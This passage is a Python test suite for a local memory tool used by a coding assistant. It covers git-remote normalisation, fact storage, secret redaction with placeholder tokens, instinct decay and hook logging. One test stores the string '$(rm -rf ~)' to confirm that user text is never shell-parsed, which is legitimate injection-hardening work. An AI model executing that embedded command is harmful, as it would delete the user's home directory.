"""Tests for mem.py. Run from local_memory/: python3 -m unittest discover -s tests"""
import datetime as dt
import io
import json
import multiprocessing
import os
import stat
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from contextlib import contextmanager, redirect_stdout
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(HERE))
import mem  # noqa: E402


def git(cwd, *args):
    subprocess.run(["git", "-C", str(cwd), *args], check=True, capture_output=True)


class MemTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.env = mock.patch.dict(os.environ, {"COPILOT_HOME": str(self.tmp / "copilot")})
        self.env.start()
        os.environ.pop("LOCAL_MEMORY_HOME", None)
        os.environ.pop("LOCAL_MEMORY_MIN_CONFIDENCE", None)
        os.environ.pop("LOCAL_MEMORY_REPO", None)
        mem._git.cache_clear()
        self.repo = self.tmp / "work" / "proj"
        self.repo.mkdir(parents=True)
        git(self.repo, "init", "-q")
        git(self.repo, "remote", "add", "origin", "git@github.com:me/proj.git")
        self.other = self.tmp / "work" / "other"
        self.other.mkdir()
        git(self.other, "init", "-q")
        git(self.other, "remote", "add", "origin", "https://github.com/me/other")
        self.plain = self.tmp / "plain"
        self.plain.mkdir()

    def tearDown(self):
        self.env.stop()

    def run_cli(self, *args, cwd=None, stdin=""):
        out = io.StringIO()
        with mock.patch.object(sys, "stdin", io.StringIO(stdin)), redirect_stdout(out):
            code = mem.main(["--cwd", str(cwd or self.repo), *args])
        return code, out.getvalue()

    def hook(self, event, payload, cwd=None):
        return self.run_cli("hook", event, stdin=json.dumps(payload), cwd=cwd or self.plain)


class RepoIdentityTest(MemTestCase):
    def test_same_repo_same_id_across_remote_forms(self):
        forms = ["git@github.com:me/proj.git", "https://github.com/me/proj", "https://u:tok@GitHub.com/me/proj.git/",
                 "ssh://git@github.com/me/proj.git"]
        self.assertEqual({mem.normalize_remote(f) for f in forms}, {"github.com/me/proj"})

    def test_ids(self):
        rid, source = mem.repo_identity(self.repo)
        self.assertTrue(rid.startswith("proj-"))
        self.assertEqual(source, "github.com/me/proj")
        self.assertEqual(mem.repo_identity(self.repo / "."), (rid, source))
        self.assertIsNone(mem.repo_identity(self.plain))

    def test_workspace_folder_holding_repos_gets_one_memory(self):
        ws = self.repo.parent
        rid, source = mem.repo_identity(ws)
        self.assertEqual(source, str(ws.resolve()))
        self.assertNotEqual(rid, mem.repo_identity(self.repo)[0])  # a repository inside still has its own
        self.assertIsNone(mem.repo_identity(self.plain))

    def test_repo_without_remote_uses_its_path(self):
        local = self.tmp / "local"
        local.mkdir()
        git(local, "init", "-q")
        rid, source = mem.repo_identity(local)
        self.assertTrue(rid.startswith("local-"))
        self.assertEqual(source, str(local.resolve()))

    def test_remote_forms_normalize_to_one_key(self):
        scheme = "git" + "+ssh"  # written out so the scheme is not mistaken for a git command
        forms = [f"{scheme}://git@github.com/me/proj.git", "ssh://git@github.com:22/me/proj.git",
                 "git@GitHub.com:Me/Proj.git", "https://GITHUB.com/me/PROJ/", "ssh://me@github.com:2222/me/proj"]
        self.assertEqual({mem.normalize_remote(f) for f in forms}, {"github.com/me/proj"})

    def test_windows_and_file_remotes(self):
        self.assertEqual(mem.normalize_remote(r"C:\Users\Me\Repos\Proj.git"), "c:/users/me/repos/proj")
        self.assertEqual(mem.normalize_remote("file:///C:/Repos/proj"), "c:/repos/proj")
        self.assertEqual(mem.normalize_remote("/srv/Git/Proj.git/"), "/srv/git/proj")

    def test_local_memory_repo_override_survives_a_moved_folder(self):
        moved = self.tmp / "elsewhere" / "proj"
        moved.mkdir(parents=True)
        git(moved, "init", "-q")
        with mock.patch.dict(os.environ, {"LOCAL_MEMORY_REPO": "my-project"}):
            before = mem.repo_identity(self.plain)  # works even outside a repository
            self.assertEqual(before, mem.repo_identity(moved))
            self.assertEqual(before[1], "my-project")
        self.assertNotEqual(mem.repo_identity(moved), before)

    def test_repeated_lookups_run_git_once_each(self):
        with mock.patch.object(mem.subprocess, "run", wraps=mem.subprocess.run) as run:
            mem.repo_identity(self.repo)
            mem.repo_identity(self.repo)
            self.assertEqual(run.call_count, 2)  # rev-parse and config, then cached
            self.assertLess(mem.GIT_TIMEOUT_SECONDS, 5)  # the shortest hook budget

    def test_read_commands_create_no_directories(self):
        self.run_cli("recall")
        self.run_cli("instincts")
        self.run_cli("observations")
        self.run_cli("hook", "session-start", stdin=json.dumps({"cwd": str(self.repo)}))
        self.assertFalse((mem.memory_root() / "repos").exists())
        self.run_cli("remember", "a fact")
        self.assertEqual(len(list((mem.memory_root() / "repos").iterdir())), 1)


class MemoryTest(MemTestCase):
    def test_remember_dedupes_and_forgets(self):
        self.assertEqual(self.run_cli("remember", "Use", "make", "test")[0], 0)
        _, out = self.run_cli("remember", "use make test.")
        self.assertIn("already", out)
        _, out = self.run_cli("recall")
        self.assertIn("- Use make test (", out)
        self.assertEqual(self.run_cli("forget", "MAKE")[0], 0)
        self.assertNotIn("make test", self.run_cli("recall")[1])

    def test_forget_needs_all_for_several_matches(self):
        self.run_cli("remember", "--user", "likes tabs")
        self.run_cli("remember", "--user", "likes short answers")
        code, _ = self.run_cli("forget", "--user", "likes")
        self.assertEqual(code, 1)
        self.assertEqual(self.run_cli("forget", "--user", "--all", "likes")[0], 0)

    def test_repo_memory_needs_a_repo(self):
        code, _ = self.run_cli("remember", "x", cwd=self.plain)
        self.assertEqual(code, 1)
        self.assertEqual(self.run_cli("remember", "--user", "x", cwd=self.plain)[0], 0)

    def test_scopes_are_separate(self):
        self.run_cli("remember", "proj fact")
        _, out = self.run_cli("recall", cwd=self.other)
        self.assertNotIn("proj fact", out)

    def test_user_memory_goes_into_instructions_file(self):
        self.run_cli("remember", "--user", "Prefers a summary first")
        text = mem.instructions_file().read_text()
        self.assertTrue(text.startswith('---\napplyTo: "**"\n---\n'))
        self.assertIn("Prefers a summary first", text)
        self.run_cli("forget", "--user", "summary")
        self.assertNotIn("Prefers a summary first", mem.instructions_file().read_text())

    def test_memory_is_capped_to_newest_lines(self):
        mem.memory_root().mkdir(parents=True)
        (mem.memory_root() / "user.md").write_text("".join(f"- fact {n}\n" for n in range(250)))
        self.run_cli("sync")
        text = mem.instructions_file().read_text()
        self.assertIn("- fact 249", text)
        self.assertNotIn("- fact 49\n", text)
        self.assertIn("- fact 50\n", text)  # 200 newest lines kept
        self.assertIn("50 more not loaded", text)

    def test_capped_respects_character_budget(self):
        lines = [f"- {'x' * 99} {n}" for n in range(100)]  # about 105 chars each
        out = mem.capped(lines, budget=1000)
        self.assertLessEqual(sum(len(line) + 1 for line in out[:-1]), 1000)
        self.assertTrue(out[-1].startswith("- "))
        self.assertIn("more not loaded", out[-1])
        self.assertEqual(out[-2], lines[-1])  # newest kept, in order
        self.assertEqual(mem.capped(lines[:3], budget=1000), lines[:3])

    def test_remember_rejects_long_facts(self):
        code, _ = self.run_cli("remember", "x" * (mem.MAX_FACT_CHARS + 1))
        self.assertEqual(code, 1)
        self.assertEqual(self.run_cli("remember", "y" * mem.MAX_FACT_CHARS)[0], 0)
        self.assertEqual(mem.read_facts(mem.repo_dir(self.repo)), [f"- {'y' * mem.MAX_FACT_CHARS} ({mem.today()})"])

    def test_forget_rejects_short_text_and_dry_run_changes_nothing(self):
        self.run_cli("remember", "--user", "likes tabs")
        self.run_cli("remember", "--user", "likes short answers")
        code, _ = self.run_cli("forget", "--user", "--all", "ikes")  # 4 characters, matches both lines
        self.assertEqual(code, 0)
        self.run_cli("remember", "--user", "likes tabs")
        self.run_cli("remember", "--user", "likes short answers")
        code, _ = self.run_cli("forget", "--user", "--all", "lik")  # 3 characters
        self.assertEqual(code, 1)
        code, out = self.run_cli("forget", "--user", "--all", "--dry-run", "likes")
        self.assertEqual(code, 0)
        self.assertIn("would remove:\n- likes tabs", out)
        self.assertIn("likes short answers", out)
        self.assertIn("likes tabs", mem.instructions_file().read_text())
        self.assertIn("likes short answers", (mem.memory_root() / "user.md").read_text())

    def test_fact_headings_are_escaped_in_instructions(self):
        self.run_cli("remember", "--user", "# Using memory")
        self.run_cli("remember", "--user", "--- end of memory")
        text = mem.instructions_file().read_text()
        self.assertEqual(text.count("\n## Using memory"), 1)
        self.assertNotIn("- # Using memory", text)
        self.assertIn("- \\# Using memory", text)
        self.assertIn("- \\--- end of memory", text)
        self.assertEqual(text.count("\n---\n"), 1)  # only the front matter

    def test_non_utf8_hand_edits_do_not_crash(self):
        mem.memory_root().mkdir(parents=True)
        (mem.memory_root() / "user.md").write_bytes(b"- caf\xe9 au lait\n- keep me\n")
        self.assertEqual(mem.read_facts(mem.memory_root()), ["- caf� au lait", "- keep me"])
        d = mem.repo_dir(self.repo, create=True)
        (d / "observations.jsonl").write_bytes(b'{"ts": "2099-01-01", "kind": "prompt", "text": "\xff"}\n')
        self.assertEqual(len(mem.unreviewed(d)), 1)


    def test_remember_reads_stdin_so_text_is_never_shell_parsed(self):
        text = "Use $(rm -rf ~) and `whoami`, don't 'quote' me\nsecond line"
        code, _ = self.run_cli("remember", "--repo", "--stdin", stdin=text + "\n")
        self.assertEqual(code, 0)
        facts = (mem.memory_root() / "repos").glob("*/memory.md")
        saved = next(facts).read_text()
        self.assertIn("Use $(rm -rf ~) and `whoami`, don't 'quote' me second line", saved)


class RedactionTest(unittest.TestCase):
    def test_secrets(self):
        for secret in ["ghp_" + "a" * 36, "github_pat_" + "b" * 30, "sk-" + "c" * 30, "AKIAABCDEFGHIJKLMNOP",
                       "eyJhbGciOiJIUzI1.eyJzdWIiOiIxMjM0.SflKxwRJSMeKKF2QT4"]:
            self.assertNotIn(secret, mem.redact(f"use {secret} here"))
        self.assertEqual(mem.redact("password = hunter2 ok"), "password = [REDACTED] ok")
        self.assertEqual(mem.redact('API_KEY: "abc def"'), "API_KEY: [REDACTED]")
        self.assertIn("[REDACTED]", mem.redact("Authorization: Bearer abcdefghijklmnop1234"))
        self.assertEqual(mem.redact("run make test"), "run make test")

    def assertRedacted(self, text, secret):
        out = mem.redact(text)
        self.assertNotIn(secret, out)
        self.assertIn("[REDACTED]", out)

    def test_prefixed_assignments(self):
        self.assertRedacted("AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI", "wJalrXUtnFEMI")
        self.assertRedacted("MY_API_KEY=abc123xyz", "abc123xyz")
        self.assertRedacted("DB_PASSWORD=hunter2", "hunter2")

    def test_url_credentials(self):
        self.assertEqual(mem.redact("postgres://u:pw@h/db"), "postgres://[REDACTED]@h/db")

    def test_basic_auth_header(self):
        self.assertRedacted("Authorization: Basic dXNlcjpwYXNzd29yZA==", "dXNlcjpwYXNzd29yZA")

    def test_vendor_prefixes(self):
        for secret in ["npm_" + "d" * 36, "glpat-" + "e" * 20, "sk_live_" + "f" * 16, "AIza" + "G" * 35,
                       "ya29." + "h" * 20]:
            self.assertRedacted(f"key {secret} end", secret)

    def test_password_phrase_redacts_whole_value(self):
        self.assertEqual(mem.redact("password: my secret pass"), "password: [REDACTED]")

    def test_space_separated_flags(self):
        self.assertRedacted("run cli --password hunter2 now", "hunter2")
        self.assertRedacted("run cli --token abc123 now", "abc123")

    def test_high_entropy_fallback(self):
        secret = "Qz8mK2pLx9Vw3Rt7Yn1Bc5Hd0Fg6Js4Ua"
        self.assertRedacted(f"see {secret} end", secret)
        sha = "3f9a1c2b7d4e8f0a6b5c9d1e2f3a4b5c6d7e8f90"
        self.assertEqual(mem.redact(f"commit {sha}"), f"commit {sha}")

    def test_remember_redacts(self):
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(os.environ, {"LOCAL_MEMORY_HOME": tmp,
                                                                                "COPILOT_HOME": tmp}):
            mem.remember("user", "token=abc123secret", Path(tmp))
            self.assertNotIn("abc123secret", (Path(tmp) / "user.md").read_text())


class InstinctTest(MemTestCase):
    def instinct(self, *extra, cwd=None):
        return self.run_cli("instinct", "prefer-pnpm", "--trigger", "when installing packages", "--action",
                            "Use pnpm", *extra, cwd=cwd)

    def test_create_reinforce_cap_weaken_delete(self):
        _, out = self.instinct("--evidence", "corrected npm")
        self.assertIn("created repo instinct prefer-pnpm (50%)", out)
        for expected in ("60%", "70%", "80%", "90%", "90%"):
            self.assertIn(expected, self.run_cli("instinct", "prefer-pnpm")[1])
        self.assertIn("70%", self.run_cli("weaken", "prefer-pnpm")[1])
        self.run_cli("weaken", "prefer-pnpm")
        self.run_cli("weaken", "prefer-pnpm")
        self.assertIn("deleted", self.run_cli("weaken", "prefer-pnpm")[1])
        self.assertIn("no instincts", self.run_cli("instincts")[1])

    def test_instinct_from_stdin_first_line_is_trigger(self):
        code, out = self.run_cli("instinct", "prefer-pnpm", "--stdin", "--evidence", "user corrected npm",
                                 stdin="when installing packages\nUse $(pnpm), not `npm`\n")
        self.assertEqual(code, 0, out)
        i = mem.parse_instinct(next((mem.memory_root() / "repos").glob("*/instincts/prefer-pnpm.md")))
        self.assertEqual(i["trigger"], "when installing packages")
        self.assertEqual(i["action"], "Use $(pnpm), not `npm`")

    def test_new_instinct_needs_trigger_and_action(self):
        self.assertEqual(self.run_cli("instinct", "x")[0], 1)
        self.assertEqual(self.run_cli("instinct", "Bad_Id", "--trigger", "t", "--action", "a")[0], 1)

    def test_file_round_trip(self):
        self.instinct("--evidence", 'said "use pnpm": twice')
        path = next((mem.memory_root() / "repos").glob("*/instincts/prefer-pnpm.md"))
        i = mem.parse_instinct(path)
        self.assertEqual(i["trigger"], "when installing packages")
        self.assertEqual(i["action"], "Use pnpm")
        self.assertEqual(i["confidence"], 0.5)
        self.assertEqual(len(i["evidence"]), 1)
        self.assertIn('said "use pnpm": twice', i["evidence"][0])

    def write_instinct(self, scope_dir, instinct_id, confidence, days_ago):
        last = (dt.date.today() - dt.timedelta(days=days_ago)).isoformat()
        i = {"id": instinct_id, "trigger": "when installing packages", "action": "Use pnpm",
             "confidence": confidence, "seen": 1, "created": last, "last_seen": last, "evidence": []}
        mem.write_atomic(mem.instincts_dir(scope_dir) / f"{instinct_id}.md", mem.format_instinct(i))
        return mem.instincts_dir(scope_dir) / f"{instinct_id}.md"

    def test_action_may_contain_evidence_heading(self):
        action = "Use pnpm\n## Evidence\n- not real evidence\nand keep the rest"
        mem.add_instinct("repo", "prefer-pnpm", "when installing packages", action, None, self.repo)
        mem.add_instinct("repo", "prefer-pnpm", None, None, "corrected npm", self.repo)
        path = next((mem.memory_root() / "repos").glob("*/instincts/prefer-pnpm.md"))
        i = mem.parse_instinct(path)
        self.assertEqual(i["action"], action)
        self.assertEqual(len(i["evidence"]), 1)
        self.assertIn("corrected npm", i["evidence"][0])

    def test_multiline_action_is_shown_on_one_line(self):
        mem.add_instinct("repo", "prefer-pnpm", "when installing", "Use pnpm\nnot npm", None, self.repo)
        _, out = self.run_cli("instincts")
        self.assertIn("prefer-pnpm: when installing -> Use pnpm not npm", out)
        self.assertIn("- [50%] when installing: Use pnpm not npm", mem.instinct_lines(
            [(0.5, mem.parse_instinct(next((mem.memory_root() / "repos").glob("*/instincts/prefer-pnpm.md"))))]))

    def test_decay_is_continuous(self):
        i = {"confidence": 0.9, "last_seen": "2026-01-01"}
        self.assertEqual(mem.effective_confidence(i, dt.date(2026, 1, 1)), 0.9)
        self.assertEqual(mem.effective_confidence(i, dt.date(2026, 1, 16)), 0.85)  # 15 days: half a step
        self.assertEqual(mem.effective_confidence(i, dt.date(2026, 1, 31)), 0.8)   # 30 days
        self.assertEqual(mem.effective_confidence(i, dt.date(2026, 3, 5)), 0.69)   # 63 days
        self.assertEqual(mem.effective_confidence(i, dt.date(2030, 1, 1)), 0.0)

    def test_stale_instincts_are_pruned_on_session_start(self):
        stale = self.write_instinct(mem.repo_dir(self.repo), "stale", 0.5, days_ago=200)
        fresh = self.write_instinct(mem.repo_dir(self.repo), "fresh", 0.5, days_ago=0)
        self.run_cli("hook", "session-start", stdin=json.dumps({"cwd": str(self.repo)}))
        self.assertFalse(stale.exists())
        self.assertTrue(fresh.exists())

    def test_stale_instincts_do_not_count_for_promotion(self):
        for repo in (self.repo, self.other):
            self.write_instinct(mem.repo_dir(repo), "prefer-pnpm", 0.9, days_ago=400)
        self.assertEqual(mem.promotion_candidates(), [])

    def test_reinforce_builds_on_decayed_value(self):
        self.write_instinct(mem.repo_dir(self.repo), "prefer-pnpm", 0.9, days_ago=60)  # decayed to 0.7
        self.instinct()
        i = mem.parse_instinct(mem.instincts_dir(mem.repo_dir(self.repo)) / "prefer-pnpm.md")
        self.assertEqual(i["confidence"], 0.8)  # not back to 0.9 + 0.1
        self.assertEqual(i["last_seen"], mem.today())

    def test_weaken_uses_decayed_value_and_keeps_last_seen(self):
        path = self.write_instinct(mem.repo_dir(self.repo), "prefer-pnpm", 0.9, days_ago=60)  # decayed to 0.7
        _, out = self.run_cli("weaken", "prefer-pnpm")
        self.assertIn("weakened repo instinct prefer-pnpm (50%)", out)
        i = mem.parse_instinct(path)
        self.assertEqual(i["last_seen"], (dt.date.today() - dt.timedelta(days=60)).isoformat())
        self.assertEqual(mem.effective_confidence(i), 0.5)

    def test_weaken_deletes_decayed_instinct(self):
        path = self.write_instinct(mem.repo_dir(self.repo), "prefer-pnpm", 0.4, days_ago=120)  # decayed to 0.0
        self.assertIn("deleted repo instinct prefer-pnpm", self.run_cli("weaken", "prefer-pnpm")[1])
        self.assertFalse(path.exists())

    def test_cap_drops_lowest_confidence(self):
        with mock.patch.object(mem, "MAX_INSTINCTS_PER_SCOPE", 3):
            weak = self.write_instinct(mem.repo_dir(self.repo), "weak", 0.3, days_ago=0)
            self.write_instinct(mem.repo_dir(self.repo), "mid", 0.6, days_ago=0)
            self.write_instinct(mem.repo_dir(self.repo), "strong", 0.9, days_ago=0)
            self.instinct()  # creates prefer-pnpm, needs room
        self.assertFalse(weak.exists())
        ids = {p.stem for p in mem.instincts_dir(mem.repo_dir(self.repo)).glob("*.md")}
        self.assertEqual(ids, {"mid", "strong", "prefer-pnpm"})

    def test_promotion_needs_distinct_repos(self):
        for _ in range(8):
            self.instinct(cwd=self.repo)  # one repository, reinforced 8 times
        self.assertEqual(mem.promotion_candidates(), [])
        self.assertNotIn("Ready to promote", self.run_cli("instincts")[1])


    def test_only_confident_instincts_are_loaded(self):
        self.instinct()  # 50%
        self.assertEqual(self.run_cli("hook", "session-start", stdin=json.dumps({"cwd": str(self.repo)}))[1], "")
        self.instinct()
        self.instinct()  # 70%
        _, out = self.run_cli("hook", "session-start", stdin=json.dumps({"cwd": str(self.repo)}))
        context = json.loads(out)["additionalContext"]
        self.assertIn("- [70%] when installing packages: Use pnpm", context)

    def test_long_instinct_text_is_clipped_when_loaded(self):
        self.instinct()
        self.instinct()
        self.instinct()  # 70%
        self.run_cli("instinct", "prefer-pnpm", "--action", "a" * 1000)
        _, out = self.run_cli("hook", "session-start", stdin=json.dumps({"cwd": str(self.repo)}))
        line = next(l for l in json.loads(out)["additionalContext"].splitlines() if "when installing" in l)
        self.assertLessEqual(len(line), mem.MAX_FACT_CHARS + 60)

    def test_user_facts_not_sent_twice_at_session_start(self):
        self.run_cli("remember", "--user", "Prefers tabs")
        self.run_cli("remember", "Run make test")
        _, out = self.run_cli("hook", "session-start", stdin=json.dumps({"cwd": str(self.repo)}))
        context = json.loads(out)["additionalContext"]
        self.assertIn("Run make test", context)
        self.assertNotIn("Prefers tabs", context)  # already in the instructions file
        self.assertIn("Prefers tabs", mem.instructions_file().read_text())

    def test_user_instincts_go_into_instructions(self):
        for _ in range(3):
            self.instinct("--user")
        self.assertIn("[70%] when installing packages: Use pnpm", mem.instructions_file().read_text())

    def test_promote(self):
        for repo in (self.repo, self.other):
            for _ in range(4):
                self.instinct(cwd=repo)  # 80%
        self.assertIn("Ready to promote", self.run_cli("instincts")[1])
        _, out = self.run_cli("promote", "prefer-pnpm")
        self.assertIn("promoted prefer-pnpm to global (80%)", out)
        self.assertIn("Use pnpm", mem.instructions_file().read_text())
        _, out = self.run_cli("instincts")
        self.assertIn("user  80% active    prefer-pnpm", out)
        self.assertNotIn("repo", out)


class HookTest(MemTestCase):
    def test_session_start_with_both_payload_shapes(self):
        self.run_cli("remember", "Run make test")
        camel = {"sessionId": "s", "timestamp": 1, "cwd": str(self.repo), "source": "new"}
        vscode = {"hook_event_name": "SessionStart", "session_id": "s", "timestamp": "x", "cwd": str(self.repo),
                  "source": "startup"}
        for payload in (camel, vscode):
            code, out = self.hook("session-start", payload)
            self.assertEqual(code, 0)
            context = json.loads(out)["additionalContext"]
            self.assertIn("Local memory for this repository (github.com/me/proj)", context)
            self.assertIn("- Run make test (", context)

    def test_session_start_outside_repo_or_empty_prints_nothing(self):
        self.assertEqual(self.hook("session-start", {"cwd": str(self.plain)})[1], "")
        self.assertEqual(self.hook("session-start", {"cwd": str(self.other)})[1], "")
        self.assertTrue(mem.instructions_file().exists())  # synced anyway

    def test_logs_prompts_failures_and_stops(self):
        self.hook("user-prompt", {"cwd": str(self.repo), "prompt": "No, use pnpm instead of npm"})
        self.hook("user-prompt", {"cwd": str(self.repo), "prompt": "add a login page token=s3cret"})
        self.hook("tool-failure", {"cwd": str(self.repo), "toolName": "bash", "toolArgs": {"command": "npm test"},
                                   "error": "npm: command not found"})
        self.hook("tool-failure", {"cwd": str(self.repo), "tool_name": "edit", "tool_input": {}, "error": "boom"})
        self.hook("agent-stop", {"cwd": str(self.repo), "transcript_path": "/tmp/t.jsonl"})
        _, out = self.run_cli("observations")
        lines = out.strip().splitlines()
        self.assertIn("prompt [correction?]: No, use pnpm instead of npm", lines[0])
        self.assertNotIn("correction", lines[1])
        self.assertNotIn("s3cret", out)
        self.assertIn("bash failed: npm: command not found | args: npm", lines[2])
        self.assertIn("edit failed: boom", lines[3])
        self.assertIn("transcript: /tmp/t.jsonl", lines[4])
        self.run_cli("mark-reflected")
        self.assertIn("nothing logged", self.run_cli("observations")[1])

    def test_terminal_tools_log_only_the_first_word(self):
        self.hook("tool-failure", {"cwd": str(self.repo), "toolName": "run_in_terminal",
                                   "toolArgs": json.dumps({"command": "npm test --token=zzz", "explanation": "why"}),
                                   "error": "fail"})
        _, out = self.run_cli("observations")
        self.assertIn("run_in_terminal failed: fail | args: npm", out)
        self.assertNotIn("zzz", out)
        self.assertNotIn("explanation", out)

    @unittest.skipIf(os.name == "nt", "POSIX file modes")
    def test_log_files_and_dirs_are_private(self):
        self.hook("user-prompt", {"cwd": str(self.repo), "prompt": "hello"})
        d = next((mem.memory_root() / "repos").glob("proj-*"))
        self.assertEqual(stat.S_IMODE((d / "observations.jsonl").stat().st_mode), 0o600)
        self.assertEqual(stat.S_IMODE(d.stat().st_mode), 0o700)

    def test_logging_can_be_turned_off(self):
        with mock.patch.dict(os.environ, {"LOCAL_MEMORY_LOG": "off"}):
            self.hook("user-prompt", {"cwd": str(self.repo), "prompt": "hello"})
            self.hook("tool-failure", {"cwd": str(self.repo), "toolName": "bash", "toolArgs": {"command": "ls"},
                                       "error": "boom"})
        self.assertEqual(self.run_cli("observations")[1].strip(), "nothing logged since the last reflection")

    def test_logging_off_creates_no_repo_directory(self):
        events = (("user-prompt", {"prompt": "hello"}),
                  ("tool-failure", {"toolName": "bash", "toolArgs": {"command": "ls"}, "error": "boom"}),
                  ("agent-stop", {"transcript_path": "/tmp/t.jsonl"}))
        with mock.patch.dict(os.environ, {"LOCAL_MEMORY_LOG": "off"}):
            for event, payload in events:
                self.assertEqual(self.hook(event, {"cwd": str(self.repo), **payload})[1], "")
        self.assertFalse((mem.memory_root() / "repos").exists())
        for event, payload in events:  # with logging on, the same hooks do create it
            self.hook(event, {"cwd": str(self.repo), **payload})
        self.assertTrue((mem.memory_root() / "repos").is_dir())

    def test_nudges_reflect_after_many_observations(self):
        for n in range(20):
            self.hook("user-prompt", {"cwd": str(self.repo), "prompt": f"task {n}"})
        _, out = self.hook("session-start", {"cwd": str(self.repo)})
        self.assertIn("suggest the user runs /alx-reflect", json.loads(out)["additionalContext"])

    def test_bad_input_never_fails(self):
        for event, stdin in (("session-start", "not json"), ("user-prompt", "[1,2]"), ("nope", "{}"),
                             ("tool-failure", "")):
            code, out = self.run_cli("hook", event, stdin=stdin, cwd=self.plain)
            self.assertEqual(code, 0)
            self.assertEqual(out, "")
        self.assertIn("unknown hook event", (mem.memory_root() / "hook-errors.log").read_text())

    def test_observation_log_rotates(self):
        with mock.patch.object(mem, "MAX_OBSERVATION_BYTES", 200):
            for n in range(10):
                self.hook("user-prompt", {"cwd": str(self.repo), "prompt": f"prompt number {n}"})
        d = next((mem.memory_root() / "repos").glob("proj-*"))
        self.assertTrue((d / "observations.1.jsonl").exists())
        self.assertLess((d / "observations.jsonl").stat().st_size, 400)


def _log_worker(root, d, tag, count, max_bytes):
    os.environ["LOCAL_MEMORY_HOME"] = root
    mem.MAX_OBSERVATION_BYTES = max_bytes
    for i in range(count):
        mem.log_observation(Path(d), {"ts": mem.now_iso(), "kind": "prompt", "text": f"{tag}-{i} " + "x" * 150})


def _remember_worker(root, copilot, tag, count):
    os.environ["LOCAL_MEMORY_HOME"] = root
    os.environ["COPILOT_HOME"] = copilot
    for i in range(count):
        mem.remember("user", f"{tag} fact {i}", Path(root))


class ConcurrencyTest(MemTestCase):
    def run_processes(self, target, argsets):
        ctx = multiprocessing.get_context("spawn")
        procs = [ctx.Process(target=target, args=args) for args in argsets]
        for p in procs:
            p.start()
        for p in procs:
            p.join(120)
        self.assertEqual([p.exitcode for p in procs], [0] * len(procs))

    def test_concurrent_observations_are_not_lost(self):
        root = self.tmp / "memhome"
        d = root / "obs"
        procs, per = 4, 100
        self.run_processes(_log_worker, [(str(root), str(d), f"p{n}", per, 40_000) for n in range(procs)])
        self.assertTrue((d / "observations.1.jsonl").exists())  # rotation happened while writers raced
        seen = []
        for p in [d / "observations.jsonl", *(mem.rotated_path(d, n) for n in range(1, mem.KEEP_ROTATED + 1))]:
            if p.exists():
                seen += [json.loads(line)["text"].split()[0] for line in p.read_text().splitlines()]
        self.assertEqual(sorted(seen), sorted(f"p{n}-{i}" for n in range(procs) for i in range(per)))

    def test_concurrent_remember_loses_no_facts(self):
        root = self.tmp / "memhome"
        self.run_processes(_remember_worker, [(str(root), str(self.tmp / "copilot"), f"p{n}", 25) for n in range(4)])
        self.assertEqual(len((root / "user.md").read_text().splitlines()), 100)

    def test_unreviewed_reads_rotated_files(self):
        d = self.tmp / "obs"
        d.mkdir()
        (d / "reflected_at").write_text("2026-01-02T00:00:00+00:00\n")
        old = {"ts": "2026-01-03T00:00:00+00:00", "kind": "prompt", "text": "in rotated file"}
        new = {"ts": "2026-01-04T00:00:00+00:00", "kind": "prompt", "text": "in current file"}
        (d / "observations.1.jsonl").write_text(json.dumps(old) + "\n")
        (d / "observations.jsonl").write_text(json.dumps(new) + "\n")
        self.assertEqual([r["text"] for r in mem.unreviewed(d)], ["in rotated file", "in current file"])


class ObservationCountTest(MemTestCase):
    def hook(self, event, payload):
        return self.run_cli("hook", event, stdin=json.dumps({"cwd": str(self.repo), **payload}), cwd=self.repo)

    def log_dir(self):
        return mem.repo_dir(self.repo, required=False, create=True)

    def fake_clock(self):
        """One second per call, so records logged right after a reflection still sort after it."""
        ticks = iter(range(10_000))
        start = dt.datetime(2026, 1, 1, tzinfo=dt.timezone.utc)
        return mock.patch.object(mem, "now_iso",
                                 side_effect=lambda: (start + dt.timedelta(seconds=next(ticks))).isoformat(timespec="seconds"))

    def truth(self):
        """Nag count computed the slow way, straight from the log."""
        return sum(1 for r in mem.unreviewed(self.log_dir()) if r.get("kind") != "stop")

    def test_count_tracks_the_log_through_reflections(self):
        with self.fake_clock():
            self._count_through_reflections()

    def _count_through_reflections(self):
        d = self.log_dir()
        self.hook("user-prompt", {"prompt": "one"})
        self.hook("tool-failure", {"tool_name": "bash", "error": "x"})
        self.hook("agent-stop", {"transcript_path": "/t"})
        self.assertEqual(mem.count_unreviewed(d), 2)
        self.assertEqual(mem.count_unreviewed(d), self.truth())
        self.run_cli("mark-reflected")
        self.assertEqual(mem.count_unreviewed(d), 0)
        for n in range(3):
            self.hook("user-prompt", {"prompt": f"after {n}"})
        self.assertEqual(mem.count_unreviewed(d), 3)
        self.assertEqual(mem.count_unreviewed(d), self.truth())

    def test_session_start_reads_the_sidecar_not_the_log(self):
        for n in range(25):
            self.hook("user-prompt", {"prompt": f"task {n}"})
        with mock.patch.object(mem, "unreviewed", side_effect=AssertionError("log was parsed")):
            context = mem.repo_context(self.repo)
        self.assertIn("25 prompts and tool failures", context)

    def test_log_without_sidecar_is_counted_once(self):
        d = self.log_dir()
        old = mem.now_iso()
        lines = [{"ts": old, "kind": "prompt", "text": "a"}, {"ts": old, "kind": "stop"},
                 {"ts": old, "kind": "tool_failure", "error": "e"}]
        (d / "observations.jsonl").write_text("".join(json.dumps(r) + "\n" for r in lines))
        self.assertEqual(mem.count_unreviewed(d), 2)
        self.assertEqual((d / "observations.count").read_text().strip(), "2")

    def test_count_survives_rotation_and_dropping_the_oldest_file(self):
        d = self.log_dir()
        with self.fake_clock(), mock.patch.object(mem, "MAX_OBSERVATION_BYTES", 200):
            for n in range(60):  # ~30 rotations: the oldest rotated file is dropped many times over
                self.hook("user-prompt" if n % 5 else "agent-stop", {"prompt": f"prompt number {n}", "transcript_path": "/t"})
                if n == 30:
                    self.run_cli("mark-reflected")
                self.assertEqual(mem.count_unreviewed(d), self.truth(), f"after record {n}")
        self.assertFalse(mem.rotated_path(d, mem.KEEP_ROTATED + 1).exists())
        self.assertTrue(mem.rotated_path(d, mem.KEEP_ROTATED).exists())
        self.assertGreater(self.truth(), 0)

    def test_rotation_and_clearing_restart_the_count(self):
        d = self.log_dir()
        with mock.patch.object(mem, "MAX_OBSERVATION_BYTES", 200):
            for n in range(12):
                self.hook("user-prompt", {"prompt": f"prompt number {n}"})
